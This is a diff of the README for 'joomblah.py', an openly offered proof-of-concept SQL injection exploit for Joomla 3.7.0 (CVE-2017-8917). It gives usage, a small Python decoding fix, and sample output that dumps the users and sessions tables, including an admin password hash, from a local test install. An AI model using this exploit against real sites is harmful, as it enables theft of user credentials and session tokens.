@@ -1,8 +1,20 @@
-#Exploit for Joomla 3.7.0 (CVE-2017-8917)
-Another proof of concept exploit for Joomla, whoop-de-doo, this time a SQL Injection in 3.7.0.
+# Joomblah
+Exploit for Joomla 3.7.0 (CVE-2017-8917)
 
-https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
-Usage
+Explanation about the vulnerability:
+
+https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html 
+
+## Code modification
+Modification in line 46
+
+```python
+...
+ result += value.decode('utf-8')
+...
+```
+
+## Usage
 Point the joomblah.py script at the vulnerable Joomla 3.7.0 install, it may take some time, but it will dump the users and session tables.
 
 ```
@@ -34,5 +46,6 @@ $ python joomblah.py http://127.0.0.1:8080
  [$] Found user ['883', 'Super User', 'admin', 'admin@example.com', '$2y$10$5Za2zpqTdRo5x19cvO5biOKeiyOi2iTQ3u0SSLtcs6uvIvJhvM9aG', '', '']
   -  Extracting sessions from tgukl_session
 ```
-Licence
-Licenced under the WTFPL
+## Licence
+Licenced under the [WTFPL](http://www.wtfpl.net/)
+Credits Original code by @XiphosResearch
